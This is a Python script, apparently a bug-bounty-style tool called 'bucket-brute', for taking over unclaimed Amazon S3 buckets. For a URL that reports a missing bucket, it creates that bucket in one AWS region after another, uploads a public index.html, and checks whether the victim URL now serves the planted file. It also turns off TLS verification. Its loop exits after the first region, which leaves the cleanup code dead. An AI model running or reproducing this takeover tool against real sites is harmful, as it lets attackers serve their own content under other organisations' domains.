#!/usr/bin/env python
#
# bucket-brute
#
#
# By @randomrobbieBF
# 
#
import logging
import boto3
import requests
import sys
import argparse
import os.path
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from botocore.exceptions import ClientError
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",   required=True,help="No Such Bucket URL")
parser.add_argument("-p", "--proxy", required=False, help="Proxy for debugging")
parser.add_argument("-b", "--bucket", required=True,help="Bucket Name")
args = parser.parse_args()
url = args.url
proxy = args.proxy
bucket = args.bucket



if proxy:
	proxy = args.proxy
else:
	proxy = ""


http_proxy = proxy
proxyDict = { 
              "http"  : http_proxy, 
              "https" : http_proxy, 
              "ftp"   : http_proxy
            }
            
region = ["us-east-1","us-east-2","us-west-1","us-west-2","eu-central-1","eu-west-1","eu-west-2","eu-south-1","eu-west-3","eu-north-1","af-south-1","ap-east-1","ap-south-1","ap-northeast-3","ap-northeast-2","ap-southeast-1","ap-southeast-2","ap-northeast-1","ca-central-1","cn-north-1","cn-northwest-1","me-south-1","sa-east-1"]


def create_bucket(bucket, region):
    """Create an S3 bucket in a specified region

    If a region is not specified, the bucket is created in the S3 default
    region (us-east-1).

    :param bucket_name: Bucket to create
    :param region: String region to create bucket in, e.g., 'us-west-2'
    :return: True if bucket created, else False
    """

    # Create bucket
    try:
        if region == "us-east-1":
            s3_client = boto3.client('s3')
            s3_client.create_bucket(Bucket=bucket)
            
        else:
            s3_client = boto3.client('s3', region_name=region)
            location = {'LocationConstraint': region}
            s3_client.create_bucket(Bucket=bucket,CreateBucketConfiguration=location)
    except Exception as e:
        if "conflicting conditional operation" in str(e):
        	print("[-] S3 Bucket Delete Operation in progress wait a while as this can take a long time [-]")
        	sys.exit(0)
        print('Error: %s' % e)
        return False
    return True




def delete_bucket_completely(bucket):

    client = boto3.client('s3')

    response = client.list_objects_v2(
        Bucket=bucket,
    )

    while response['KeyCount'] > 0:
        print('[-] Deleting %d objects from bucket %s [-]' % (len(response['Contents']),bucket))
        response = client.delete_objects(
            Bucket=bucket,
            Delete={
                'Objects':[{'Key':obj['Key']} for obj in response['Contents']]
            }
        )
        response = client.list_objects_v2(
            Bucket=bucket,
        )

    print('[-] Now deleting bucket %s [-]' % bucket)
    response = client.delete_bucket(
        Bucket=bucket
    )

def upload_file(file_name, bucket, object_name=None):
    """Upload a file to an S3 bucket

    :param file_name: File to upload
    :param bucket: Bucket to upload to
    :param object_name: S3 object name. If not specified then file_name is used
    :return: True if file was uploaded, else False
    """

    # If S3 object_name was not specified, use file_name
    if object_name is None:
        object_name = file_name

    # Upload the file
    s3_client = boto3.client('s3')
    try:
        response = s3_client.upload_file(file_name, bucket, object_name,ExtraArgs={'ACL': 'public-read'})
        print("[*] File Uploaded to S3 "+bucket+" [*]")
    except ClientError as e:
        logging.error(e)
        sys.exit(0)
        return False
    return True


def try_bucket(url,bucket,reg):
	
	headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
	response = session.get(""+url+"/index.html", headers=headers,verify=False,timeout=30,proxies=proxyDict)
	if response.status_code == 200 and "5aaae00a56f055d19d70af5b45f6e19f" in response.text:
		print("\n")
		print("********** Bucket Found ********** ")
		print("Bucket Found: %s" % response.text)
		print("********************************* ")
		print ("\n")
		sys.exit(0)

	else:
		print (response.text)
		sys.exit(0)
		#print ("[-] Bucket Brute Failed [-]")
		print("[-] Removing "+bucket+" in region "+reg+" [-]")
		delete_bucket_completely(bucket)
		print ("[-] Sleeping 180 seconds [-]")
		time.sleep(180)
		return False
		
		

try:
	for reg in region:
		print("[*] Creating "+bucket+" in region "+reg+" [*]")
		create_bucket(bucket, region=reg)
		file_name="index.html"
		upload_file(file_name, bucket, object_name=None)
		#os.system("aws s3api create-bucket --bucket "+bucket+" --create-bucket-configuration LocationConstraint="+reg+" --acl public-read --region "+reg+"")
		#os.system("aws s3 cp index.html s3://"+bucket+" --region "+reg+" --acl public-read")
		try_bucket(url,bucket,reg)
	
except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
				
except Exception as e:
		print('Error: %s' % e)
		sys.exit(1)
